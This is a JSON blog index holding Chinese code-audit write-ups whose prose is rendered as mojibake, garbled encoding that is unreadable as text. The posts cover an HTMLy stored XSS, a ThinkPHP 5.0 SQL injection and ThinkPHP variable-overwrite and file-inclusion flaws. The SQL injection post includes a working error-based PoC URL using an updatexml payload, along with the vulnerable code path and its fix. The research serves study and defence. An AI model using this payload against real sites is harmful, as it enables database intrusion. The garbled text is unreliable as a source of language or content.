å¦‚æœå­˜åœ¨ï¼Œä½¿ç”¨strtr()å‡½æ•°å°†æ¢è¡Œç¬¦æ›¿æ¢æˆ\\nï¼Œå†ç”¨trim()å»æ‰å€¼çš„é¦–å°¾ç©ºç™½å­—ç¬¦ï¼Œç„¶åå°†ç»“æœå­˜å…¥$data[$k]ã€‚ å¦‚æœé”®ä¸å­˜åœ¨ï¼Œå°†ç»“æœè®¾ç½®ä¸ºnullã€‚ return $data;: å¦‚æœ$nameæ˜¯æ•°ç»„ï¼Œè¿”å›å¤„ç†åçš„ç»“æœæ•°ç»„$dataã€‚ return isset($source[$name]) ? trim(strtr($source[$name], $map)) : null;: å¦‚æœ$nameä¸æ˜¯æ•°ç»„ï¼Œåˆ™ç›´æ¥ä»$sourceä¸­è·å–å¯¹åº”çš„å€¼ï¼Œå¤„ç†åè¿”å›ã€‚ å¦‚æœé”®ä¸å­˜åœ¨ï¼Œè¿”å›nullã€‚ ç”±äºè¯¥å‡½æ•°å¯¹ä¼ å…¥çš„æ•°æ®æ²¡æœ‰è¿›è¡Œä¸¥æ ¼è¿‡æ»¤ï¼Œæ‰€ä»¥å¯¼è‡´äº†æ¼æ´çš„å­˜åœ¨ã€‚ 0x04 æ”»å‡»æ¼”ç¤ºæ¼æ´ç‚¹ï¼šhttp://htmly:8088///add/content?type=postæ–‡ç« å†…å®¹å†™å…¥å¤„å­˜åœ¨xssç‚¹å‡»xssçš„æ–‡ç« è§¦å‘xssæ¼æ´","categories":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"https://gryffinbit.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://gryffinbit.top/tags/XSS/"}],"author":"Gryffinbit"},{"title":"thinkphp5.0 parseData sql æ³¨å…¥æ¼æ´åˆ†æ","slug":"thinkphp5-0-sql-æ³¨å…¥æ¼æ´åˆ†æ","date":"2024-08-07T03:29:03.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2024/08/07/thinkphp5-0-sql-æ³¨å…¥æ¼æ´åˆ†æ/","permalink":"https://gryffinbit.top/2024/08/07/thinkphp5-0-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"0X01 æ¼æ´æ¦‚å†µæœ¬æ¬¡æ¼æ´å­˜åœ¨äº Builder ç±»çš„ parseData æ–¹æ³•ä¸­ã€‚ç”±äºç¨‹åºæ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œå¾ˆå¥½çš„è¿‡æ»¤ï¼Œå°†æ•°æ®æ‹¼æ¥è¿› SQL è¯­å¥ï¼Œå¯¼è‡´ SQLæ³¨å…¥æ¼æ´ çš„äº§ç”Ÿã€‚æ¼æ´å½±å“ç‰ˆæœ¬ï¼š 5.0.13&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.15 ã€ 5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.5 ã€‚ å®éªŒç¯å¢ƒ composerç‰ˆæœ¬1.8.5 1composer create-project --prefer-dist topthink/think=5.0.15 thinkphp5015 å°† composer.json æ–‡ä»¶çš„ require å­—æ®µè®¾ç½®æˆå¦‚ä¸‹ï¼š 1234&quot;require&quot;: &#123; &quot;php&quot;: &quot;&gt;=5.4.0&quot;, &quot;topthink/framework&quot;: &quot;5.0.15&quot;&#125; æ‰§è¡Œupdate 1composer update å¯ä»¥ç›´æ¥ç”¨phpstudyå¸¦çš„composer ä¿®æ”¹ application/index/controller/Index.php æ–‡ä»¶ 123456789101112&lt;?phpnamespace app\\index\\controller;class Index&#123; public function index() &#123; $username = request()-&gt;get(&#x27;username/a&#x27;); db(&#x27;users&#x27;)-&gt;insert([&#x27;username&#x27; =&gt; $username]); return &#x27;Update success&#x27;; &#125;&#125; åˆ›å»ºæ•°æ®åº“ 1234create table users( id int primary key auto_increment, username varchar(50) not null); é…ç½®æ•°æ®åº“ åœ¨ application/database.php æ–‡ä»¶ä¸­é…ç½®æ•°æ®åº“ç›¸å…³ä¿¡æ¯ï¼Œå¹¶å¼€å¯ application/config.php ä¸­çš„ app_debug å’Œ app_trace é…ç½®å®Œæˆ 0X02 æ¼æ´å¤ç°POC1http://&lt;yoursite&gt;/public/index.php/index/index?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]=1 å‚æ•°éƒ¨åˆ†åŒ…å«ä¸‰ä¸ªé”®å€¼å¯¹ï¼š username[0]=incï¼šè®¾ç½® username[0] å‚æ•°çš„å€¼ä¸º incã€‚ username[1]=updatexml(1,concat(0x7,user(),0x7e),1)ï¼šè®¾ç½® username[1] å‚æ•°çš„å€¼ä¸º updatexml(1,concat(0x7,user(),0x7e),1)ã€‚ username[2]=1ï¼šè®¾ç½® username[2] å‚æ•°çš„å€¼ä¸º 1ã€‚ å…¶ä¸­ï¼Œusername[1] çš„å€¼ï¼Œæ˜¯ä¸€ä¸ªè¯•å›¾åˆ©ç”¨ updatexml å‡½æ•°è¿›è¡Œ SQL æ³¨å…¥çš„ç¤ºä¾‹ 1updatexml(1, concat(0x7, user(), 0x7e), 1) updatexmlæ˜¯ MySQL ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºæ›´æ–° XML æ•°æ®ã€‚åœ¨è¿™é‡Œåˆ©ç”¨å®ƒæ¥æ‰§è¡Œä»»æ„ SQL æŸ¥è¯¢ã€‚ concat(0x7, user(), 0x7e)ï¼šconcat å‡½æ•°ç”¨äºè¿æ¥å­—ç¬¦ä¸²ã€‚0x7 å’Œ 0x7e æ˜¯åå…­è¿›åˆ¶è¡¨ç¤ºçš„å­—ç¬¦ï¼Œåˆ†åˆ«æ˜¯ BEL å’Œ ~ï¼ˆæ¢æˆåˆ«çš„ä»€ä¹ˆä¹±ä¸ƒå…«ç³Ÿçš„ä¹Ÿå¯ä»¥ï¼‰ã€‚å®ƒä»¬ä¼šä¸å½“å‰æ•°æ®åº“ç”¨æˆ·çš„åå­—ï¼ˆé€šè¿‡ user() å‡½æ•°è·å–ï¼‰æ‹¼æ¥åœ¨ä¸€èµ·ã€‚ ç”±äº updatexml å‡½æ•°çš„è®¾è®¡ï¼Œè¿™ç§æ‹¼æ¥çš„å­—ç¬¦ä¸²ä¼šè¢«æ’å…¥åˆ° XML æ–‡æ¡£ä¸­ï¼Œå¹¶è¿”å›é”™è¯¯æ¶ˆæ¯ï¼Œå…¶ä¸­åŒ…å«æ‹¼æ¥çš„å†…å®¹ã€‚è¿™æ ·ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡é”™è¯¯æ¶ˆæ¯è·å–æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚å½“å‰æ•°æ®åº“ç”¨æˆ·ã€‚ user()è·å–å½“å‰æ•°æ®åº“ç”¨æˆ·çš„åå­— version() è·å–å½“å‰æ•°æ®åº“ç‰ˆæœ¬ 0X03 ä»£ç åˆ†æè°ƒç”¨é“¾ æ¼æ´å‡½æ•°application/index/controller/Index.php 123456public function index()&#123; $username = request()-&gt;get(&#x27;username/a&#x27;); db(&#x27;users&#x27;)-&gt;insert([&#x27;username&#x27; =&gt; $username]); return &#x27;Update success&#x27;;&#125; request()-&gt;get(&#39;username/a&#39;)ï¼šä»è¯·æ±‚ä¸­è·å– username å‚æ•°ï¼Œå¹¶å‡è®¾å®ƒæ˜¯ä¸€ä¸ªæ•°ç»„ã€‚ db(&#39;users&#39;)-&gt;insert([&#39;username&#39; =&gt; $username])ï¼šå°†è·å–åˆ°çš„ username å‚æ•°æ’å…¥åˆ° users è¡¨ä¸­ã€‚ return &#39;Update success&#39;ï¼šè¿”å›ä¸€ä¸ªç®€å•çš„æˆåŠŸæ¶ˆæ¯ã€‚ **è·Ÿè¿›insert ** 1db(&#x27;users&#x27;)-&gt;insert([&#x27;username&#x27; =&gt; $username]); è¿›æ¥åè·Ÿè¿›ç”Ÿæˆsqlè¯­å¥ï¼Œçœ‹\\think\\db\\Query::insertå‡½æ•°å¦‚ä½•å¤„ç†æ•°æ® è·Ÿè¿›\\think\\db\\Builder::insert æ•°æ®ä¼šå…ˆç»è¿‡\\think\\db\\Builder::parseDataè¿›è¡Œå¤„ç† è·Ÿè¿›\\think\\db\\Builder::parseData è·å–å­—æ®µåˆ—è¡¨ 123456$bind = $this-&gt;query-&gt;getFieldsBind($options[&#x27;table&#x27;]);if (&#x27;*&#x27; == $options[&#x27;field&#x27;]) &#123; $fields = array_keys($bind);&#125; else &#123; $fields = $options[&#x27;field&#x27;];&#125; getFieldsBind è·å– $options[&#39;table&#39;]è¡¨çš„å­—æ®µç»‘å®šä¿¡æ¯ï¼Œå¹¶å­˜å‚¨åœ¨ $bind ä¸­ã€‚å¦‚æœ $options[&#39;field&#39;] ç­‰äº &#39;*&#39;ï¼Œè¡¨ç¤ºé€‰æ‹©æ‰€æœ‰å­—æ®µï¼Œåˆ™å°† $bind ä¸­çš„æ‰€æœ‰é”®ï¼ˆå­—æ®µåï¼‰å­˜å‚¨åœ¨ $fields ä¸­ã€‚å¦åˆ™ï¼Œå°† $options[&#39;field&#39;] çš„å€¼å­˜å‚¨åœ¨ $fields ä¸­ã€‚ å¤„ç†æ•°æ® result åˆå§‹åŒ–åˆ›å»ºä¸€ä¸ªç©ºæ•°ç»„ç”¨äºå­˜æ”¾ç»“æœæ•°æ® foreach å¾ªç¯éå†ä¼ å…¥çš„æ•°æ® dataï¼Œç”¨ä»¥å¤„ç†é”®å€¼å¯¹ å¦‚æœé”®å€¼å¯¹ä¸­çš„å€¼val æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶ä¸”å­˜åœ¨toString çš„æ–¹æ³•ï¼Œåˆ™è°ƒç”¨è¯¥æ–¹æ³•ï¼Œå°†å…¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚ æ£€æŸ¥é”® key æ˜¯å¦åŒ…å«â€.â€ï¼Œä¸”æ˜¯å¦æ˜¯fieldså­—æ®µåˆ—è¡¨ä¸­çš„ã€‚ å¦‚æœä¸åœ¨ï¼Œå¹¶ä¸”æ˜¯åœ¨ä¸¥æ ¼æ¨¡å¼ ($options[&#39;strict&#39;]ä¸º true) ï¼ŒæŠ›å‡ºå¼‚å¸¸ã€‚ å¦‚æœå€¼ä¸ºç©ºï¼Œåˆ™è¿”å›åˆ°ç»“æœæ•°ç»„ä¸­ï¼Œç½®ä¸ºNULL å¦‚æœä¸ä¸ºç©ºï¼Œåˆ™å¯¹ $val[0]è¿›è¡Œåˆ¤æ–­ï¼Œåˆ†ä¸‰æ”¯ä¸º â€˜expâ€™ã€â€™incâ€™ã€â€™decâ€™ã€æ ¹æ®æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼ˆè¡¨ç¤ºæ“ä½œç±»å‹ï¼‰è¿›è¡Œä¸åŒå¤„ç†ã€‘ &#39;exp&#39;: è¡¨è¾¾å¼ï¼Œç›´æ¥ä½¿ç”¨å€¼ã€‚ å½“ $val æ˜¯ä¸€ä¸ªæ•°ç»„ä¸” $val[0] ä¸º &#39;exp&#39; æ—¶ï¼Œç›´æ¥å°† $val[1] èµ‹å€¼ç»™ $result[$item]ã€‚&#39;exp&#39; é€šå¸¸è¡¨ç¤ºä¸€ä¸ªåŸç”Ÿçš„æ•°æ®åº“è¡¨è¾¾å¼ï¼Œå› æ­¤ä¸éœ€è¦è¿›ä¸€æ­¥å¤„ç†ã€‚ ä¾‹å¦‚ï¼š $val = [&#39;exp&#39;, &#39;NOW()&#39;]ï¼Œåˆ™ $result[$item] å°†è¢«èµ‹å€¼ä¸º &#39;NOW()&#39;ï¼Œè¡¨ç¤ºåœ¨ SQL ä¸­ä½¿ç”¨å½“å‰æ—¶é—´ã€‚ &#39;inc&#39;: é€’å¢æ“ä½œï¼Œè§£æé”®å¹¶æ„é€ é€’å¢è¡¨è¾¾å¼ã€‚ å½“ $val æ˜¯ä¸€ä¸ªæ•°ç»„ä¸” $val[0] ä¸º &#39;inc&#39; æ—¶ï¼Œè¡¨ç¤ºä¸€ä¸ªé€’å¢æ“ä½œã€‚$val[1] æ˜¯è¦é€’å¢çš„å­—æ®µåï¼Œ$val[2] æ˜¯é€’å¢çš„å€¼ã€‚ ä¾‹å¦‚ï¼šå¦‚æœ $val = [&#39;inc&#39;, &#39;updatexml(0,concat(0x7,version(),0x7e),1)&#39;, 1]ï¼Œå¹¶ä¸” parseKey(&#39;updatexml(0,concat(0x7,version(),0x7e),1)&#39;) è¿”å› &#39;updatexml(0,concat(0x7,version(),0x7e),1)&#39;ï¼Œåˆ™ $result[$item] å°†è¢«èµ‹å€¼ä¸º &#39;updatexml(0,concat(0x7,version(),0x7e),1) + 1&#39; &#39;dec&#39;: é€’å‡æ“ä½œï¼Œè§£æé”®å¹¶æ„é€ é€’å‡è¡¨è¾¾å¼ã€‚ è·Ÿè¿› \\think\\db\\Builder::parseKey å¯¹ $val æ²¡æœ‰è¿›è¡Œä»»ä½•è¿‡æ»¤å¤„ç†ï¼Œæ€ä¹ˆè¿›å»çš„ï¼Œæ€ä¹ˆå‡ºæ¥çš„ã€‚å¹¶ä¸”ç›´æ¥æ‹¼æ¥ $val[2] 1234protected function parseKey($key, $options = [])&#123; return $key;&#125; æ‰€ä»¥ä»parseData æ–¹æ³•å¤„ç†åï¼Œå‡ºæ¥çš„æ•°æ®æ˜¯ updatexml(0,concat(0x7,version(),0x7e),1) + 1 **å›åˆ°\\think\\db\\Builder::insert**ï¼Œå‘ä¸‹è·Ÿè¿› ç”Ÿæˆä¸€ä¸ªå®Œæ•´çš„sqlè¯­å¥ 1INSERT INTO `users` (`username`) VALUES (updatexml(0,concat(0x7,version(),0x7e),1)+1) 0X04 ä¿®å¤æ–¹æ¡ˆ ä¿®å¤æ¼æ´çš„åŸç†åœ¨äºé¿å…ç›´æ¥å°†ç”¨æˆ·è¾“å…¥çš„$val[1]å€¼æ‹¼æ¥åˆ° SQL è¯­å¥ä¸­ï¼Œè€Œæ˜¯ä½¿ç”¨å®‰å…¨çš„æ–¹å¼æ¥æ„å»º SQL è¯­å¥ã€‚ ä¿®å¤å‰ï¼š 123case &#x27;inc&#x27;: $result[$item] = $this-&gt;parseKey($val[1]) . &#x27;+&#x27; . floatval($val[2]); break; åœ¨è¿™æ®µä»£ç ä¸­ï¼Œ$val[1] æ˜¯ç”¨æˆ·è¾“å…¥çš„å€¼ï¼Œå¹¶é€šè¿‡ $this-&gt;parseKey æ–¹æ³•è¿›è¡Œå¤„ç†åï¼Œç›´æ¥æ‹¼æ¥åˆ° $result[$item] ä¸­ã€‚è¿™ç§ç›´æ¥æ‹¼æ¥æ–¹å¼å¾ˆå®¹æ˜“å—åˆ° SQL æ³¨å…¥æ”»å‡»çš„å½±å“ã€‚ ä¿®å¤åï¼š 1$result[$item] = $item . &#x27;+&#x27; . floatval($val[2]); **ä½¿ç”¨ $item ä»£æ›¿ parseKey($val[1])**ï¼š $item æ˜¯é€šè¿‡ $this-&gt;parseKey($key, $options) æ–¹æ³•è§£æåçš„å®‰å…¨å­—æ®µåã€‚ï¼ˆ$itermçš„å€¼ä¸ºusernameï¼‰ è¿™æ ·å¯ä»¥ç¡®ä¿ $item æ˜¯ä¸€ä¸ªå®‰å…¨çš„å­—æ®µåï¼Œé¿å…ç›´æ¥ä½¿ç”¨ç”¨æˆ·è¾“å…¥çš„å€¼ã€‚ å°† floatval($val[2]) ä¸ $item æ‹¼æ¥ï¼š floatval($val[2]) å°†ç”¨æˆ·è¾“å…¥çš„å€¼è½¬æ¢ä¸ºæµ®ç‚¹æ•°ï¼Œä»¥ç¡®ä¿å®ƒæ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„æ•°å€¼ï¼Œä»è€Œé¿å…äº†å­—ç¬¦ä¸²æˆ–å…¶ä»–ç±»å‹çš„æ³¨å…¥ã€‚ æ‰€ä»¥æœ€ç»ˆä¿®å¤åçš„ç»“æœğŸ‘‡","categories":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"https://gryffinbit.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"}],"tags":[{"name":"thinkphp","slug":"thinkphp","permalink":"https://gryffinbit.top/tags/thinkphp/"}],"author":"Gryffinbit"},{"title":"thinkphp5.0 æ–‡ä»¶åŒ…å«æ¼æ´åˆ†æ-è¶…è¯¦ç»†ä¿å§†çº§","slug":"thinkphp5-0æ–‡ä»¶åŒ…å«æ¼æ´åˆ†æ","date":"2024-08-07T03:28:36.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2024/08/07/thinkphp5-0æ–‡ä»¶åŒ…å«æ¼æ´åˆ†æ/","permalink":"https://gryffinbit.top/2024/08/07/thinkphp5-0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","excerpt":"","text":"0X01 æ¼æ´æ¦‚å†µåœ¨äº ThinkPHP æ¨¡æ¿å¼•æ“ä¸­ï¼Œåœ¨åŠ è½½æ¨¡ç‰ˆè§£æå˜é‡æ—¶å­˜åœ¨å˜é‡è¦†ç›–é—®é¢˜ï¼Œè€Œä¸”ç¨‹åºæ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œå¾ˆå¥½çš„è¿‡æ»¤ï¼Œæœ€ç»ˆå¯¼è‡´æ–‡ä»¶åŒ…å«æ¼æ´ çš„äº§ç”Ÿã€‚æ¼æ´å½±å“ç‰ˆæœ¬ï¼š 5.0.0&lt;&#x3D;ThinkPHP5&lt;&#x3D;5.0.18 ã€5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.10ã€‚ å®éªŒç¯å¢ƒThinkPHP-Vuln&#x2F;ThinkPHP5&#x2F;ThinkPHP5æ¼æ´åˆ†æä¹‹æ–‡ä»¶åŒ…å«7.md at master Â· Mochazz&#x2F;ThinkPHP-Vuln (github.com) ç‰ˆæœ¬ï¼šthinkphp5.0.0~5.0.18 çš†å¯ 5.0.12ç‰ˆæœ¬çš„å®‰è£…ï¼š ä¸‹è½½gitæºç ï¼šReleases Â· top-think&#x2F;think (github.com) å°†æºç æ”¾åœ¨phpstudyçš„wwwç›®å½•ä¸‹ phpç‰ˆæœ¬å¤§äº5.4 composerå®‰è£… composerç‰ˆæœ¬1.8.5 æ›´æ¢composeré•œåƒæº 1composer config -g repo.packagist composer https://mirrors.cloud.tencent.com/composer/ composerå®‰è£… 12cd thinkphp5.0.12composer install 5.0.18 ç‰ˆæœ¬çš„å®‰è£…ï¼š phpstudy æ–°å»ºä¸€ä¸ªç½‘ç«™ ç”¨phpstudy é‡Œçš„composerï¼Œé€šè¿‡ä»¥ä¸‹å‘½ä»¤è·å–æµ‹è¯•ç¯å¢ƒä»£ç ï¼š 1composer create-project --prefer-dist topthink/think=5.0.18 tpdemo å°† composer.json æ–‡ä»¶çš„ require å­—æ®µè®¾ç½®æˆå¦‚ä¸‹ 1234&quot;require&quot;: &#123; &quot;php&quot;: &quot;&gt;=5.6.0&quot;, &quot;topthink/framework&quot;: &quot;5.0.18&quot;&#125;, åœ¨ tpdemo ç›®å½•ä¸‹æ‰§è¡Œ 1composer update 0X02 PHPå˜é‡è¦†ç›–æ¼æ´åŸç†ä»‹ç»è‡ªå®šä¹‰çš„å‚æ•°å€¼æ›¿æ¢åŸæœ‰å˜é‡å€¼çš„æƒ…å†µç§°ä¸ºå˜é‡è¦†ç›–æ¼æ´ã€‚ç»å¸¸å¯¼è‡´å˜é‡è¦†ç›–æ¼æ´åœºæ™¯æœ‰ï¼š å¼€å¯äº†å…¨å±€å˜é‡æ³¨å†Œ $$ ä½¿ç”¨ä¸å½“ extract() å‡½æ•°ä½¿ç”¨ä¸å½“ parse_str() å‡½æ•°ä½¿ç”¨ä¸å½“ import_request_variables() ä½¿ç”¨ä¸å½“ç­‰ã€‚ å…¨å±€å˜é‡æ³¨å†Œregister_globals åœ¨ PHP5.3 ä¹‹å‰ï¼Œé»˜è®¤å¼€å¯ï¼›PHP5.3 é»˜è®¤å…³é—­ï¼ŒPHP5.6 åŠ 5.7 å·²ç»è¢«ç§»é™¤. ç”±äºæœ¬æ¬¡æ¼æ´åˆ†æï¼ŒåŸºäºphp5.4 ä»¥ä¸Šç‰ˆæœ¬ï¼Œæ‰€ä»¥è¯¥æ–¹æ³•ä¸å±•å¼€è®²è§£ $$ åŠ¨æ€å˜é‡è¦†ç›–åœ¨PHPä¸­ï¼Œ$$è¢«ç§°ä¸ºâ€œå¯å˜å˜é‡â€ã€‚å¯å˜å˜é‡çš„æ¦‚å¿µæ˜¯å°†ä¸€ä¸ªå˜é‡çš„å€¼ä½œä¸ºå¦ä¸€ä¸ªå˜é‡çš„åå­—ã€‚ å‡è®¾ä½ æœ‰ä¸€ä¸ªå˜é‡ $aï¼Œå¹¶ä¸”ä½ å¸Œæœ›åŠ¨æ€åœ°åˆ›å»ºæˆ–è®¿é—®ä¸€ä¸ªä»¥ $a çš„å€¼ä¸ºåå­—çš„å˜é‡ã€‚è¿™æ—¶å°±å¯ä»¥ç”¨åˆ° $$ã€‚ 123456&lt;?php$a = &quot;hello&quot;;$$a = &quot;world&quot;;echo $hello; // è¾“å‡º &quot;world&quot;?&gt; åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼š é¦–å…ˆï¼Œ$a è¢«èµ‹å€¼ä¸ºå­—ç¬¦ä¸² &quot;hello&quot;ã€‚ æ¥ç€ï¼Œ$$a å°±ç­‰åŒäº $helloï¼Œå› ä¸º $a çš„å€¼æ˜¯ &quot;hello&quot;ã€‚ ç„¶åï¼Œæˆ‘ä»¬ç»™ $hello èµ‹å€¼ä¸º &quot;world&quot;ã€‚ æœ€åï¼Œè¾“å‡º $hello çš„å€¼ï¼Œç»“æœæ˜¯ &quot;world&quot;ã€‚ é€šè¿‡è¿™ç§æ–¹å¼ï¼Œä½ å¯ä»¥åŠ¨æ€åœ°åˆ›å»ºå’Œè®¿é—®å˜é‡ã€‚è¿™ç§ç”¨æ³•åœ¨éœ€è¦æ ¹æ®å˜é‡åçš„å€¼æ¥ç”Ÿæˆæ–°å˜é‡åçš„æƒ…å†µä¸‹éå¸¸æœ‰ç”¨ï¼Œä¾‹å¦‚åœ¨å¤„ç†åŠ¨æ€æ•°æ®æˆ–é…ç½®æ—¶ã€‚ å®æ“ä¸€é“é¢˜ï¼Œæ¥è·å–flag 1234567891011121314&lt;?phpforeach (array(&#x27;_POST&#x27;,&#x27;_GET&#x27;) as $_request) &#123; foreach ($$_request as $_key=&gt;$_value) &#123; $$_key = $_value; &#125;&#125;$id = isset($id) ? $id : 2;if ($id == 1) &#123; include(&#x27;./flag.php&#x27;); // ç¡®ä¿æ–‡ä»¶åæ­£ç¡® die();&#125;?&gt; $_key=&gt;$_value æ˜¯ä¸€ä¸ªé”®å€¼å¯¹ï¼Œ=&gt; ç¬¦å·åœ¨PHPä¸­ç”¨äºå…³è”æ•°ç»„ä¸­çš„é”®å’Œå€¼çš„åˆ†éš”ï¼Œå·¦ä¾§æ˜¯é”®ï¼Œå³ä¾§æ˜¯å€¼ã€‚ å¤–å±‚ foreach è¿­ä»£ï¼Œç¬¬ä¸€æ¬¡ $_request çš„å€¼æ˜¯ &#39;_POST&#39;ï¼Œåœ¨ç¬¬äºŒæ¬¡è¿­ä»£ä¸­ï¼Œ$_request çš„å€¼æ˜¯ &#39;_GET&#39;ã€‚ å†…å±‚ foreach è¿­ä»£ï¼Œä¼šéå† $_POST æ•°ç»„çš„æ‰€æœ‰é”®å€¼å¯¹ï¼Œç„¶åéå† $_GET æ•°ç»„çš„é”®å€¼å¯¹ã€‚å¹¶ä¸”åŠ¨æ€åˆ›å»ºå˜é‡ã€‚ å‡è®¾ $_POST åŒ…å«ä»¥ä¸‹æ•°æ®ï¼š 1234$_POST = array( &quot;name&quot; =&gt; &quot;John&quot;, &quot;age&quot; =&gt; 30); å¹¶ä¸” $_GET åŒ…å«ä»¥ä¸‹æ•°æ®ï¼š 1234$_GET = array( &quot;city&quot; =&gt; &quot;New York&quot;, &quot;country&quot; =&gt; &quot;USA&quot;); æ‰§è¡Œè¿™æ®µä»£ç åï¼Œå°†ä¼šåŠ¨æ€åˆ›å»ºä»¥ä¸‹å˜é‡ï¼š 1234$name = &quot;John&quot;;$age = 30;$city = &quot;New York&quot;;$country = &quot;USA&quot;; æ¥ä¸‹æ¥æ˜¯æ£€æŸ¥idã€‚å¦‚æœå˜é‡ $id å·²è®¾ç½®ï¼ˆå³å·²ç»å®šä¹‰å¹¶ä¸”ä¸æ˜¯ nullï¼‰ï¼Œé‚£ä¹ˆ $id ä¿æŒåŸå€¼ã€‚å¦‚æœå˜é‡ $id æœªè®¾ç½®ï¼ˆå³æœªå®šä¹‰æˆ–æ˜¯ nullï¼‰ï¼Œé‚£ä¹ˆ $id è¢«èµ‹å€¼ä¸º 2ã€‚ if ($id == 1) æ£€æŸ¥å˜é‡ $id æ˜¯å¦ç­‰äº 1ã€‚å¦‚æœæ¡ä»¶ä¸ºçœŸï¼Œæ‰§è¡ŒåŒ…å«æ–‡ä»¶å’Œç»ˆæ­¢è„šæœ¬çš„æ“ä½œã€‚ include è¯­å¥ï¼šinclude(&#39;./flag.php&#39;) åœ¨åŒ…å«æ–‡ä»¶ flag.php çš„å†…å®¹ã€‚å¦‚æœæ–‡ä»¶è·¯å¾„æ­£ç¡®ä¸”æ–‡ä»¶å­˜åœ¨ï¼Œå…¶å†…å®¹å°†è¢«æ‰§è¡Œã€‚ï¼ˆåœ¨å½“å‰ç›®å½•ä¸‹ï¼‰ die() å‡½æ•°ï¼šdie() ç»ˆæ­¢è„šæœ¬çš„æ‰§è¡Œã€‚è¿™æ ·åœ¨åŒ…å«æ–‡ä»¶åï¼Œä¸ä¼šç»§ç»­æ‰§è¡Œåç»­ä»£ç ã€‚ åˆ†æä»£ç å¯çŸ¥ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦å¾—åˆ°flagã€‚ç›´æ¥ get/post ä¼ å‚ id=1 å³å¯ï¼Œå½“æ‰§è¡Œ $$_key = $_value; æ—¶ï¼Œ$_key=&quot;id&quot;ï¼Œ$$_key ç­‰ä»·äº $idï¼Œå°±ç»ˆç»“æœä¹Ÿå°±æ˜¯ $id = 1ï¼Œå®šä¹‰äº† id å‚æ•°ï¼Œå¹¶èµ‹å€¼ä¸º 1ï¼Œä¹Ÿå°±å¯¼è‡´äº†åŒ…å«flagæ–‡ä»¶ extract() å‡½æ•°ä½¿ç”¨ä¸å½“è¿™ç§ç±»å‹çš„å˜é‡è¦†ç›–ï¼Œå°±æ˜¯æ­¤æ¬¡åˆ†æçš„thinkphp5.0 æ–‡ä»¶åŒ…å«æ¼æ´ä¸­ï¼Œæ¶‰åŠåˆ°çš„æ¼æ´åŸç† extract() å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„å˜é‡è¡¨ã€‚è¯¥å‡½æ•°ä½¿ç”¨æ•°ç»„é”®åä½œä¸ºå˜é‡åï¼Œä½¿ç”¨æ•°ç»„é”®å€¼ä½œä¸ºå˜é‡å€¼ã€‚ 123456&lt;?php$a = array(&#x27;nickname&#x27; =&gt; &#x27;1ndex&#x27;);extract($a);echo $nickname;?&gt;//è¿è¡Œç»“æœä¸ºè¾“å‡º 1ndex extract(array[,flag][,prefix])ä¸‰ä¸ªå‚æ•°ï¼š arrayä¸€ä¸ªå…³è”æ•°ç»„(å¿…éœ€)ã€‚æ­¤å‡½æ•°ä¼šå°†é”®åå½“ä½œå˜é‡åï¼Œå€¼ä½œä¸ºå˜é‡çš„å€¼ã€‚ å¯¹æ¯ä¸ªé”®ï¼å€¼å¯¹éƒ½ä¼šåœ¨å½“å‰çš„ç¬¦å·è¡¨ä¸­å»ºç«‹å˜é‡ï¼Œå¹¶å—åˆ° flags å’Œ prefix å‚æ•°çš„å½±å“ã€‚å¿…é¡»ä½¿ç”¨å…³è”æ•°ç»„ï¼Œæ•°å­—ç´¢å¼•çš„æ•°ç»„å°†ä¸ä¼šäº§ç”Ÿç»“æœï¼Œé™¤éç”¨äº† EXTR_PREFIX_ALL æˆ–è€… EXTR_PREFIX_INVALIDã€‚ flagså¯¹å¾…éæ³•ï¼æ•°å­—å’Œå†²çªçš„é”®åçš„æ–¹æ³•å°†æ ¹æ®å–å‡ºæ ‡è®° flags å‚æ•°å†³å®šã€‚å¯ä»¥æ˜¯ä»¥ä¸‹å€¼ä¹‹ä¸€ï¼š EXTR_OVERWRITEå¦‚æœæœ‰å†²çªï¼Œè¦†ç›–å·²æœ‰çš„å˜é‡ã€‚(é»˜è®¤) EXTR_SKIPå¦‚æœæœ‰å†²çªï¼Œä¸è¦†ç›–å·²æœ‰çš„å˜é‡ã€‚ EXTR_PREFIX_SAMEå¦‚æœæœ‰å†²çªï¼Œåœ¨å˜é‡åå‰åŠ ä¸Šå‰ç¼€ prefixã€‚ EXTR_PREFIX_ALLç»™æ‰€æœ‰å˜é‡ååŠ ä¸Šå‰ç¼€ prefixã€‚ EXTR_PREFIX_INVALIDä»…åœ¨éæ³•ï¼æ•°å­—çš„å˜é‡åå‰åŠ ä¸Šå‰ç¼€ prefixã€‚ EXTR_IF_EXISTSä»…åœ¨å½“å‰ç¬¦å·è¡¨ä¸­å·²æœ‰åŒåå˜é‡æ—¶ï¼Œè¦†ç›–å®ƒä»¬çš„å€¼ã€‚å…¶å®ƒçš„éƒ½ä¸å¤„ç†ã€‚ 